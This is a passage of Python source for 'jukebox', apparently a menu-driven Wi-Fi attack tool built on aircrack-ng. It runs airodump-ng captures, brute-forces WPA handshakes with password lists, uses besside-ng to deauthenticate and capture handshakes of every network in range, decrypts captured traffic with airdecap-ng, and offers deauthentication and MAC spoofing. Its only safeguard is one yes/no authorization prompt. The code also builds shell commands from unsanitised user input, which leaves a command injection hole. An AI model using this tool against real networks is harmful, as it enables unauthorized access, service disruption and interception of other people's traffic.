                f'(type C1 in Network attacks to capture the handshake for {green(target_ap)})')
            capture_file_address = input('address/999 : ')
            if capture_file_address == '999':
                return
            print(f"selected capture file address is : {green(capture_file_address)} ")
            selection = input("Type Y to continue Y : ").lower()
            if selection == 'y':
                break
    if capture_file_address == '999':
        return
    else:
        clear()
        print(f"selected capture file address is : {green(capture_file_address)} \n")
        print(f"Here are the password lists that can be used in bruteforce attack\n")

        password_lists_directory_path = 'password_lists'
        while 1:
            for filename in os.listdir(password_lists_directory_path):

                full_path = os.path.join(password_lists_directory_path, filename)

                if os.path.isfile(full_path):
                    print(green(filename))
            print(f"\nType the name of the password list to be used in bruteforce attack (for example common.txt) : ")
            print(f'or type {green("1")} to give a path to your own password list : ')
            print(
                f'or type {green("999")} to cancel bruteforce attack and return to network attacks menu : '
                f'\n')
            selected_password_list = input(f'filename/1/999 : ').strip()
            if selected_password_list == '999':
                return
            if selected_password_list == '1':
                selected_password_list = input(f'give a path to your own password list : ').strip()
                print(f'your password list is {green(selected_password_list)}')
                selection = input(
                    'type y to continue with this password list or type anything to reselect : ').lower().strip()
                if selection == 'y':
                    break
            else:
                print(f'your password list is {green(selected_password_list)}')
                selection = input(
                    'type y to continue with this password list or type anything to reselect : ').lower().strip()
                if selection == 'y':
                    selected_password_list = f'password_lists/{selected_password_list}'
                    break

        clear()
        print(
            f'Running aircrack on {green(target_ap)}'
            f' using wordlist in {green(selected_password_list)} ')

        target_directory = f'/tmp/{target_ap}-password'
        os.makedirs(target_directory, exist_ok=True)
        aircrack_script = f'aircrack-ng -w {selected_password_list} -b {BSSID} -l {target_directory}/{target_ap}.txt {capture_file_address}'
        for terminal in terminals:
            subprocess.Popen(f'{terminal} -e {aircrack_script}', shell=True, preexec_fn=os.setsid, )
            print(f'aircrack-ng -w {selected_password_list} -b {BSSID} {capture_file_address}')
            print('\n')
            print(
                f'Process Complete. To check if password is found '
                f'look at {green(f"{target_directory}/{target_ap}.txt")}')
            input('press enter to return to network attacks')
            return


def capture_packets(interface, target_ap):
    output = get_airodump_output(interface)
    if output is None:
        print(
            f'If you see Airodump output above (BSSID,STATION,PWR,...) then the scan was successful However it '
            f'appears there are no devices connected to {green(target_ap)}')
        print(
            f'If you {red("dont")} see Airodump output '
            f'then there is a problem with {red("get_airodump_output")}')
        input(f'input anything to return to previous function \n')
        return

    elif output and 'Failed initializing wireless card(s)'.lower() not in output.lower():
        BSSID, CHANNEL = get_bssid_and_station_from_ap(interface, target_ap)
        print(f'Running packet capture on {green(target_ap)}')
        print(f'Switching channel on  {green(interface)} to {green(CHANNEL)}')
        switch_channel = subprocess.Popen(f'iwconfig {interface} channel {CHANNEL}', shell=True)
        switch_channel.wait()

        print(f'Running airodump {green(target_ap)}')

        target_directory = f'/tmp/{target_ap}-Captures'
        os.makedirs(target_directory, exist_ok=True)

        airodump_capture_location = f'/tmp/{target_ap}-Captures/{target_ap}'

        airodump = subprocess.Popen(
            f'airodump-ng --bssid {BSSID} -c {CHANNEL} -w {airodump_capture_location} {interface}',
            shell=True, preexec_fn=os.setsid, )

        time.sleep(30)

        clear()
        try:
            os.killpg(airodump.pid, signal.SIGTERM)
            airodump.wait()
        except ProcessLookupError:
            print('airodump killed unexpectedly', ProcessLookupError)

        print(f"Packet Capture is saved in '{green('/tmp/{target_ap}-Captures/')}'")

    else:
        print('==================================================================================================\n')
        print(f'This message is from {green("capture_handshake")}')
        print(f'There is a problem with {red("get_devices_in_AP_output")}')
        input(f'input anything to return to previous function \n')
        return


def graph_networks(target_ap):
    clear()

    print(f"To graph a network first you need to have a {green('csv')} file captured with airodump\n")
    print(f'Here is the list of all csv files that start with {green(target_ap)} in /tmp/ directory\n')

    find_files_with_locate = subprocess.run(
        f"find /tmp/ -type f -name '{target_ap}-*.csv' ! -name '*log.csv' ! -name '*kismet.csv'",
        shell=True,
        capture_output=True,
        text=True
    )
    print(find_files_with_locate.stdout)

    print(f'\ntype the address of the .csv file to continue')
    print(
        f'Or type 999 to return to Network attacks menu '
        f'(use Network attacks to capture packets for {green(target_ap)})')
    while 1:
        capture_file_address = input('address/999 : ').strip()
        if capture_file_address == '999':
            return
        print(f" selected address is {green(capture_file_address)}")
        selection = input(
            'input Y to continue with this address (input anything else to select another address):').lower().strip()
        if selection == 'y':
            break
    clear()
    print(f"Using {green('airgraph-ng')}  with {green(capture_file_address)}")

    while 1:
        selection = input('CAPR / CPG : ').lower()
        if selection == 'capr':
            graph_output_location = f'/tmp/{target_ap}-CAPR'
            airgraph_command = f'airgraph-ng -i {capture_file_address} -o {graph_output_location} -g CAPR'
            break
        if selection == 'cpg':
            graph_output_location = f'/tmp/{target_ap}-CPG'
            airgraph_command = f'airgraph-ng -i {capture_file_address} -o {graph_output_location} -g CPG'
            break
    airgraph = subprocess.Popen(airgraph_command, shell=True)
    airgraph.wait()
    input(f'output saved in {graph_output_location} press enter to continue')
    return


def besside(interface):
    print(
        f'What you are about to run is a Package called {green("besside-ng")}'
        f' that is a part of {green("Aircrack-ng")}\n')
    print(f'{green("besside-ng")}  is a tool which will crack all the WEP networks in range and log all '
          f'the WPA handshakes.  WPA handshakes can be uploaded to the online cracking service at wpa.darkircop.org.  '
          f'Wpa.darkircop.com also provides useful statistics based on user-submitted capture files about the '
          f'feasibility of WPA cracking. {green("this description is from $man besside-ng")}\n')

    print(f'This tool is intended strictly for security research and testing purposes within environments where the '
          f'user has explicit authorization to conduct such activities. Misuse of this tool against networks without '
          f'such authorization is illegal and unethical \n')

    consent = input(
        'Do you still want to continue and approve that you have authorization to use this tool (yes/no): ').lower()

    if consent == 'yes':
        clear()
        timer = 5
        while timer > 0:
            print(f"Attack starts in {timer}")
            time.sleep(1)
            timer -= 1
        for terminal in terminals:
            target_directory = f'/tmp/besside-all'
            os.makedirs(target_directory, exist_ok=True)
            besside_process = subprocess.Popen(f'{terminal} -e besside-ng {interface}',
                                               shell=True,
                                               preexec_fn=os.setsid,
                                               cwd=target_directory)
            besside_process.wait()
            print(f'Process is Complete\n',
                  f'To check if handshake capture was successful look at the {green("besside.log")} '
                  f'in {green(target_directory)}\n')
            print(
                f'If any handshake was captured then either use {green("wep.cap")} '
                f'or {green("wpa.cap")} with aircrack to bruteforce password')
            print(
                f'If you dont know which one to use then open them using {green("wireshark")} '
                f'only one of the files should have packets inside. Use the file with the packets \n')

            print('\nWPA handshakes can be uploaded to the online cracking service at wpa.darkircop.org.  '
                  'Wpa.darkircop.com also provides useful statistics based on user-submitted capture files about the '
                  'feasibility of WPA cracking.')

            input('input anything to return to network attacks menu : ')
            return


def besside_target_ap(interface, target_ap):
    bssid, channel = get_bssid_and_station_from_ap(interface, target_ap)
    print(bssid)
    if bssid:
        clear()
        for terminal in terminals:
            target_directory = f'/tmp/{target_ap}-besside'
            os.makedirs(target_directory, exist_ok=True)

            besside_process = subprocess.Popen(f'{terminal} -e besside-ng -b {bssid} {interface}',
                                               shell=True,
                                               preexec_fn=os.setsid,
                                               cwd=target_directory)
            besside_process.wait()
            print(f'Process is Complete\n',
                  f'To check if handshake capture was successful look at the {green("besside.log")} '
                  f'in {green(target_directory)}\n')
            print(f'If handshake was captured then either use {green("wep.cap")} '
                  f'or {green("wpa.cap")} with aircrack to bruteforce password')
            print(f''
                  f'If you dont know which one to use then open them using {green("wireshark")} '
                  f'only one of the files should have packets inside. Use the file with the packets \n')
            input('input anything to return to network attacks menu : ')
            return
        return
    else:
        print("BSSID not found")


def airdecap_wpa(target_ap):
    """
    https://www.aircrack-ng.org/doku.php?id=airdecap-ng

    :paramtarget_ap:
    :return:
    """
    while 1:
        print(f'Here is the list of all cap files that start with {green(target_ap)} in /tmp\n')
        find_files_with_locate = subprocess.run(
            f"find /tmp -type f -name '{target_ap}-*.cap' ",
            shell=True,
            capture_output=True,
            text=True
        )
        print(find_files_with_locate.stdout)
        capture_location = (input(
            f'Type the address of (WPA/WPA2) packet capture of {green(target_ap)} you want to decrypt : ')
                            .strip())
        password_of_ap = input(f'Type the password of {green(target_ap)} you want to decrypt : ')
        clear()
        print(f'Capture file = {green(capture_location)}\n'
              f'Password of {green(target_ap)} = {green(password_of_ap)}')
        print(f' Type {green("E")} to return to network attacks')
        selection = input('Is everything correct Y/N/E : ').lower()
        if selection == 'y':
            break
        if selection == 'e':
            return
    clear()
    print(f'Running decryption on {green(capture_location)} with airdecap \n')
    airdecap_script = f'airdecap-ng -e {target_ap} -p {password_of_ap} {capture_location}'
    airdecap = subprocess.Popen(airdecap_script, shell=True,
                                preexec_fn=os.setsid, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    airdecap.wait()
    stdout, stderr = airdecap.communicate()
    if 'Could not open' in stdout:
        print(f'{red("STDOUT")}  = {stdout}')
        print(f'{red("STDERR")}  = {stderr}')
        print(f'Decryption failed, possibly due to {red("mistype in capture file location")}')
        input('Press enter to return ')
        return
    if 'Number of decrypted WPA  packets         0' in stdout:
        print(f'{red("STDOUT")}  = {stdout}')
        print(f'{red("STDERR")}  = {stderr}')
        print(f'Decryption failed, possible mistype in {red("password")}')
        input('Press enter to return ')
        return
    potential_decap_output = ''
    if len(capture_location) >= 4:
        potential_decap_output = capture_location[:-3]
        potential_decap_output += 'dec.cap'
    print(f'\nif airdecap was successful the decrypted output must be on {green(potential_decap_output)}')
    input(f'Input anything to return to network attacks : ')


old_art = [
    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢿⡀⠀⠀⠀⠀⣠⣶⣿⣷⠀⠀⠀ ",
    "⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣦⣴⣿⡋⠀⠀⠈⢳⡄⠀⢠⣾⣿⠁⠈⣿⡆⠀⠀⠀",
    "⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⠿⠛⠉⠉⠁⠀⠀⠀⠹⡄⣿⣿⣿⠀⠀⢹⡇⠀⠀⠀",
    "⠀⠀⠀⠀⠀⣠⣾⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⣰⣏⢻⣿⣿⡆⠀⠸⣿⠀⠀⠀",
    "⠀⠀⠀⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣆⠹⣿⣷⠀⢘⣿⠀⠀⠀",
    "⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⠋⠉⠛⠂⠹⠿⣲⣿⣿⣧⠀⠀",
    "⠀⢠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣿⣿⣿⣷⣾⣿⡇⢀⠀⣼⣿⣿⣿⣧⠀",
    "⠰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⡘⢿⣿⣿⣿⠀",
    "⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣷⡈⠿⢿⣿⡆",
    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠁⢙⠛⣿⣿⣿⣿⡟⠀⡿⠀⠀⢀⣿⡇",
    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣶⣤⣉⣛⠻⠇⢠⣿⣾⣿⡄⢻⡇",
    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣦⣤⣾⣿⣿⣿⣿⣆⠁",
    '\n'
],
ascii_arts = [
    [
        "       _       __        __              ",
        "      (_)_  __/ /_____  / /_  ____  _  __",
        "     / / / / / //_/ _ \\/ __ \\/ __ \\| |/_/",
        "    / / /_/ / ,< /  __/ /_/ / /_/ />  <  ",
        " __/ /\\__,_/_/|_|\\___/_.___/\\____/_/|_|  ",
        "/___/                                    "
    ],
    [
        "     ▄█ ███    █▄     ▄█   ▄█▄    ▄████████ ▀█████████▄   ▄██████▄  ▀████    ▐████▀ ",
        "    ███ ███    ███   ███ ▄███▀   ███    ███   ███    ███ ███    ███   ███▌   ████▀  ",
        "    ███ ███    ███   ███▐██▀     ███    █▀    ███    ███ ███    ███    ███  ▐███    ",
        "    ███ ███    ███  ▄█████▀     ▄███▄▄▄      ▄███▄▄▄██▀  ███    ███    ▀███▄███▀    ",
        "    ███ ███    ███ ▀▀█████▄    ▀▀███▀▀▀     ▀▀███▀▀▀██▄  ███    ███    ████▀██▄     ",
        "    ███ ███    ███   ███▐██▄     ███    █▄    ███    ██▄ ███    ███   ▐███  ▀███    ",
        "    ███ ███    ███   ███ ▀███▄   ███    ███   ███    ███ ███    ███  ▄███     ███▄  ",
        "█▄ ▄███ ████████▀    ███   ▀█▀   ██████████ ▄█████████▀   ▀██████▀  ████       ███▄ ",
        "▀▀▀▀▀▀               ▀                                                               "
    ],
    [
        "________       ______      ______               ",
        "______(_)___  ____  /_________  /___________  __",
        "_____  /_  / / /_  //_/  _ \\_  __ \\  __ \\_  |/_/",
        "____  / / /_/ /_  ,<  /  __/  /_/ / /_/ /_>  <  ",
        "___  /  \\__,_/ /_/|_| \\___//_.___/\\____//_/|_|  ",
        "/___/                                            "
    ],
    [
        " ▄▄▄██▀▀▀█    ██  ██ ▄█▀▓█████  ▄▄▄▄    ▒█████  ▒██   ██▒",
        "   ▒██   ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓█████▄ ▒██▒  ██▒▒▒ █ █ ▒░",
        "   ░██  ▓██  ▒██░▓███▄░ ▒███   ▒██▒ ▄██▒██░  ██▒░░  █   ░",
        "▓██▄██▓ ▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██░█▀  ▒██   ██░ ░ █ █ ▒ ",
        " ▓███▒  ▒▒█████▓ ▒██▒ █▄░▒████▒░▓█  ▀█▓░ ████▓▒░▒██▒ ▒██▒",
        " ▒▓▒▒░  ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░▒▓███▀▒░ ▒░▒░▒░ ▒▒ ░ ░▓ ░",
        " ▒ ░▒░  ░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░▒░▒   ░   ░ ▒ ▒░ ░░   ░▒ ░",
        " ░ ░ ░   ░░░ ░ ░ ░ ░░ ░    ░    ░    ░ ░ ░ ░ ▒   ░    ░  ",
        " ░   ░     ░     ░  ░      ░  ░ ░          ░ ░   ░    ░  ",
        "                                     ░                   "
    ],
    [
        " ▄▄▄██▀▀▀█    ██  ██ ▄█▀▓█████  ▄▄▄▄    ▒█████  ▒██   ██▒",
        "   ▒██   ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓█████▄ ▒██▒  ██▒▒▒ █ █ ▒░",
        "   ░██  ▓██  ▒██░▓███▄░ ▒███   ▒██▒ ▄██▒██░  ██▒░░  █   ░",
        "▓██▄██▓ ▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██░█▀  ▒██   ██░ ░ █ █ ▒ ",
        " ▓███▒  ▒▒█████▓ ▒██▒ █▄░▒████▒░▓█  ▀█▓░ ████▓▒░▒██▒ ▒██▒",
        " ▒▓▒▒░  ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░▒▓███▀▒░ ▒░▒░▒░ ▒▒ ░ ░▓ ░",
        " ▒ ░▒░  ░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░▒░▒   ░   ░ ▒ ▒░ ░░   ░▒ ░",
        " ░ ░ ░   ░░░ ░ ░ ░ ░░ ░    ░    ░    ░ ░ ░ ░ ▒   ░    ░  ",
        " ░   ░     ░     ░  ░      ░  ░ ░          ░ ░   ░    ░  ",
        "                                     ░                   "
    ],
    [
        "      ███             █████               █████                         ",
        "     ░░░             ░░███               ░░███                          ",
        "     █████ █████ ████ ░███ █████  ██████  ░███████   ██████  █████ █████",
        "    ░░███ ░░███ ░███  ░███░░███  ███░░███ ░███░░███ ███░░███░░███ ░░███ ",
        "     ░███  ░███ ░███  ░██████░  ░███████  ░███ ░███░███ ░███ ░░░█████░  ",
        "     ░███  ░███ ░███  ░███░░███ ░███░░░   ░███ ░███░███ ░███  ███░░░███ ",
        "     ░███  ░░████████ ████ █████░░██████  ████████ ░░██████  █████ █████",
        "     ░███   ░░░░░░░░ ░░░░ ░░░░░  ░░░░░░  ░░░░░░░░   ░░░░░░  ░░░░░ ░░░░░ ",
        " ███ ░███                                                                ",
        "░░██████                                                                 ",
        " ░░░░░░                                                                 "
    ]
]


def interface_options():
    for options in Interface_Options:
        print(options)


def wireless_options():
    for options in wireless_attacks:
        print(options)


Interface = ["Interface", interface_options]
Wireless = ["Wireless", wireless_options]

Section = Interface
Previous_Section = Interface

if __name__ == "__main__":
    while exit != "exit":
        interface_mode = ''
        if selected_interface != '' and check_if_selected_interface_in_monitor_mode:
            interface_mode = 'Monitor'
        elif selected_interface != '' and not check_if_selected_interface_in_monitor_mode:
            interface_mode = 'Managed'
        clear()
        art = random.choice(ascii_arts)
        for i in art:
            print(i)
        print()
        Interface_Options = [
            f'{blue("--------------------------------------------------------")}',
            f'{green("1)")} Select Monitor Interface',
            f"{green('2)')} Put interface in to monitor mode",
            f"{green('3)')} Put interface in to managed mode",
            f"{green('4)')} Spoof MAC Address",
            f'{blue("--------------------------------------------------------")}',
            f'{yellow("Interface ")}     : {cyan(selected_interface)}',
            f'{yellow("Interface Mode")} : {cyan(interface_mode)}',
            f'{yellow("Interface MAC ")} : {cyan(interface_mac_address)}',
            f'{blue("--------------------------------------------------------")}',
            f"{green('N)')} Network Attacks",
            f'{blue("--------------------------------------------------------")}',
            f"{green('exit')} to close the program",
            f'{blue("--------------------------------------------------------")}',

        ]

        wireless_attacks = [
            f'{blue("--------------------Wireless-Attacks-(aircrack)-------------------")}',
            f"{green('1)')} Select a {yellow('target AP')}",
            f"{green('2)')} Select a {yellow('target OUI')} (All AP`s in a specific Router) {red('from ver 1 not updated yet')}",
            f"{green('3)')} Select a {yellow('target Device')} in {yellow('target AP')}",
            f"{blue('------------------------------------------------------------------')}",
            f"{green('D1)')} Deauth {yellow('target AP')}",
            f"{green('D2)')} Deauth {yellow('target Device')} in {yellow('target AP')}",
            f"{green('D3)')} Deauth all AP`s in selected OUI (w/ interval or roundrobin) ",
            f"{green('D4)')} Deauth all Devices in Target AP (w/ interval or roundrobin)",
            f"{blue('------------------------------------------------------------------')}",
            f"{green('C1)')} Capture Packets   on {yellow('target AP')} (Captures are stored in /tmp/TargetAP-Captures/) ",
            f"{green('C2)')} Capture Handshake of {yellow('target AP')} (Captures are stored in /tmp/TargetAP-handshakeCapture/)",
            f"{green('C3)')} Bruteforce attack on {yellow('target AP')} with Capture File",
            f"{green('C4)')} Decrypt Capture Packet of Target AP (WPA/WPA2)",
            f'{blue("--------------------Wireless-Attacks-(besside)--------------------")}',
            f"{green('B1)')} Deauth and Capture Handshake of all Networks in range {red('CAUTION')}",
            f"{green('B2)')} Deauth and Capture Handshake of Target AP",
            f'{blue("-----------------------------airgraph-----------------------------")}',
            f"{green('G1)')} Graph the Network using Capture File",
            f"{blue('------------------------------------------------------------------')}",
            f"{yellow('Interface')}         {green(':')}  {cyan(selected_interface)}",
            f"{yellow('Interface MODE')}    {green(':')}  {cyan(interface_mode)}",
            f"{yellow('Interface MAC ')}    {green(':')}  {cyan(interface_mac_address)}",
            f"{blue('------------------------------------------------------------------')}",
            f"{yellow('target AP SSID')}    {green(':')}  {cyan(target_ap)}",
            f"{yellow('target AP AUTH')}    {green(':')}  {cyan(target_ap_authentication)}",
            f"{yellow('target AP BSSID')}   {green(':')}  {cyan(target_bssid)}",
            f"{yellow('target AP CHANNEL')} {green(':')}  {cyan(target_channel)}",
            f"{yellow('target OUI')}        {green(':')}  {cyan(target_router_oui)}",
            f"{yellow('target DEVICE')}     {green(':')}  {cyan(target_device)}",
            f"{blue('------------------------------------------------------------------')}",
            f"{green('reset)')} Reset all Targets",
            f"{green('999)')}   return",
            f"{blue('------------------------------------------------------------------')}",
        ]

        Section[1]()
        print("type exit to close the program",
              "type 999 to return to previous section\n")

        match input("jukebox > ").lower():
            case "test":
                selected_interface = "wlan0"
                scan_for_networks()
                select_target_device()
                input()
            case "999":
                Section = Previous_Section

            case "exit":
                break

            case "reset":
                if Section[0] == "Wireless":
                    selected_interface = ""
                    target_ap = ""
                    target_device = ""
                    target_router_oui = ""
                    Section = Interface
                    Previous_Section = Interface

            case '1':
                if Section[0] == "Interface":
                    change_interface()
                elif Section[0] == "Wireless":
                    scan_for_networks()

            case '2':
                if Section[0] == "Interface" and selected_interface == "":
                    print("Cannot continue without selecting a interface")
                    print(selected_interface)
                elif Section[0] == "Interface":
                    switch_interface_to_monitor_mode()
                elif Section[0] == "Wireless":
                    target_router_oui = scan_for_networks_by_oui_select_router(selected_interface)

            case '3':
                if selected_interface == "":
                    print("Cannot continue without selecting a interface")
                    print(selected_interface)
                elif Section[0] == "Interface":
                    switch_interface_to_managed_mode()
                elif Section[0] == 'Wireless':
                    select_target_device()

            case '4':
                if selected_interface == "":
                    print("Select an interface first")
                if Section[0] == "Interface":
                    spoof_mac_of_interface_with_random_byte(selected_interface)

            case 'd1':
                if Section[0] == "Wireless" and target_ap == "":
                    print('Select a target AP to continue with this attack')
                    if input('Select a target Y/N').lower() == 'y':
                        scan_for_networks()
                elif Section[0] == "Wireless":
                    deauth()

            case 'd2':
                if Section[0] == "Wireless" and target_ap == "":
                    print('To select a target Device first select a target AP to continue with this attack')
                    if input('Select a target Y/N').lower() == 'y':
                        scan_for_networks()
                elif Section[0] == "Wireless" and target_device == "":
                    print("Select a Target Device to continue with this attack")
                    if input('Select a target Y/N').lower() == 'y':
                        select_target_device()
                elif Section[0] == "Wireless":
                    deauth_selected_device(selected_interface, target_device, target_ap)

            case 'd3':
                if Section[0] == "Wireless" and target_router_oui == "":
                    print("Select a target OUI to continue with this attack")
                    if input('Select a target Y/N').lower() == 'y':
                        target_router_oui = scan_for_networks_by_oui_select_router(selected_interface)
                elif Section[0] == "Wireless":
                    deauth_by_oui(selected_interface, target_router_oui)

            case 'c1':
                if Section[0] == "Wireless" and target_ap == "":
                    print('Select a target AP to continue with this attack')
                    if input('Select a target Y/N').lower() == 'y':
                        scan_for_networks()
                elif Section[0] == "Wireless":
                    capture_packets(selected_interface, target_ap)

            case 'c2':
                if Section[0] == "Wireless" and target_ap == "":
                    print('Select a target AP to continue with this attack')
                    if input('Select a target Y/N').lower() == 'y':
                        scan_for_networks()
                elif Section[0] == "Wireless":
                    capture_handshake()

            case 'c3':
                if Section[0] == "Wireless" and target_ap == "":
                    print('Select a target AP and capture its handshake to continue with this attack')
                    if input('Select a target Y/N').lower() == 'y':
                        scan_for_networks()
                elif Section[0] == "Wireless":
                    bruteforce_handshake_capture(selected_interface, target_ap)

            case 'c4':
                if Section[0] == "Wireless" and target_ap == "":
                    print('Select a target AP and to continue with this attack')
                    if input('Select a target Y/N').lower() == 'y':
                        scan_for_networks()
                elif Section[0] == "Wireless":
                    airdecap_wpa(target_ap)

            case 'b1':
                if Section[0] == "Wireless":
                    besside(selected_interface)

            case 'b2':
                if Section[0] == "Wireless" and target_ap == "":
                    print('Select a target AP and to continue with this attack')
                    if input('Select a target Y/N').lower() == 'y':
                        scan_for_networks()
                elif Section[0] == "Wireless":
                    besside_target_ap(selected_interface, target_ap)

            case 'g1':
                if Section[0] == "Wireless" and target_ap == "":
                    print('Select a target AP and to continue with this attack')
                    if input('Select a target Y/N').lower() == 'y':
                        scan_for_networks()
                elif Section[0] == "Wireless":
                    graph_networks(target_ap)

            case 'n':
                if selected_interface == "":
                    print("Cannot continue with wireless attacks without selecting a interface")
                    input('Press enter to continue')
                elif not check_if_selected_interface_in_monitor_mode():
                    print(f"Cannot continue with wireless attacks without {green('Monitor Mode')}")
                    if input(f'Switch {green(selected_interface)} to monitor mode Y/N : ').lower() == 'y':
                        switch_interface_to_monitor_mode()
                elif Section[0] == "Interface":
                    Previous_Section = Section
                    Section = Wireless
